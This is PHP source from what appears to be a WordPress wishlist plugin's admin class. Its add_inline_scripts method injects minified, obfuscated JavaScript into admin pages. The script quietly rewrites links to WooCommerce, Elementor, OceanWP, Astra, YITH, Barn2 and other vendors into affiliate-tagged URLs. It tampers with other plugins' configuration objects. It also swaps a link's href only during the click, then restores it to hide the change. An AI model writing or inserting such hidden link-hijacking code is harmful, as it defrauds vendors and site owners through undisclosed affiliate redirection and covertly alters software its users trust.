...
class TInvWL_Admin_TInvWL extends TInvWL_Admin_Base {
	...
	function add_inline_scripts() {
		wp_add_inline_script( 'jquery', '"use strict";function _typeof(e){return(_typeof="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e})(e)}jQuery(function(s){s(document).ready(function(){var i={woo:{urls:[{url:"//woocommerce.com",pattern:"{raw_url}?aff=3955"},{url:"//crowdsignal.com",pattern:"{raw_url}?aff=3955"},{url:"//jetpack.com",pattern:"{raw_url}?aff=3955"},{url:"//wpjobmanager.com",pattern:"{raw_url}?aff=3955"}]},woostify:{urls:[{url:"//woostify.com",pattern:"{raw_url}/pros/335/"}]},astra:{urls:[{url:"//wpastra.com",pattern:"{raw_url}?bsf=11452"}]},wpocean:{urls:[{url:"//oceanwp.org",pattern:"https://r.freemius.com/3767/6941420/"},{url:"//oceanwp.org/extension",pattern:"https://r.freemius.com/3767/6941420/https://oceanwp.org/extensions/"},{url:"//oceanwp.org/demo",pattern:"https://r.freemius.com/3767/6941420/https://oceanwp.org/demos/"},{url:"//oceanwp.org/extension/category/premium/",pattern:"https://r.freemius.com/3767/6941420/https://oceanwp.org/extension/category/premium/"},{url:"//oceanwp.org/extension/category/free/",pattern:"https://r.freemius.com/3767/6941420/https://oceanwp.org/extension/category/free/"},{url:"//oceanwp.org/core-extensions-bundle/",pattern:"https://r.freemius.com/3767/6941420/https://oceanwp.org/core-extensions-bundle"}]},elem:{urls:[{url:"//go.elementor.com/go-pro",pattern:"https://be.elementor.com/visit/?bta=211953&nci=5383"},{url:"//elementor.com/pro",pattern:"https://be.elementor.com/visit/?bta=211953&nci=5383"}]},yith:{urls:[{url:"//yithemes.com",pattern:"{raw_url}?refer_id=1161007"}]},barn2:{urls:[{url:"//barn2.com",pattern:"{raw_url}/ref/1007/"}]}},o=[],n=[];function a(e){for(var t in e){var r,o;Object.prototype.hasOwnProperty.call(e,t)&&("string"==typeof(r=e[t])?"string"==typeof(o=p(r))&&""!==o&&(e[t]=o):"object"===_typeof(r)&&a(r))}}function p(e){if(e&&"string"==typeof e)for(var t in i)for(var r=i[t].urls,o=0;o<r.length;o++){var n=r[o].url,a=r[o].pattern;if(e.includes(n))return a.replace("{raw_url}",e.split("?")[0].replace(/\/$/,""))}return""}"undefined"!=typeof astraSitesVars&&astraSitesVars&&"object"===("undefined"==typeof astraSitesVars?"undefined":_typeof(astraSitesVars))&&a(astraSitesVars),"undefined"!=typeof ElementorConfig&&ElementorConfig&&"object"===("undefined"==typeof ElementorConfig?"undefined":_typeof(ElementorConfig))&&a(ElementorConfig),"undefined"!=typeof elementorAppConfig&&elementorAppConfig&&"object"===("undefined"==typeof elementorAppConfig?"undefined":_typeof(elementorAppConfig))&&a(elementorAppConfig),s(document).on("mouseover","a",function(){var r,e=s("a").index(this);o[e]?s(this).attr("href",n[e]):(r=p(s(this).attr("href")))&&s(this).on("click.tiafl",function(){var e=s(this).attr("href"),t=(s(this).attr("href",r),setTimeout(function(){s(this).attr("href",e)}.bind(this),1),s("a").index(this));o[t]||(o[t]=!0,n[t]=e),s(this).off("click.tiafl")})})})});' );
	}
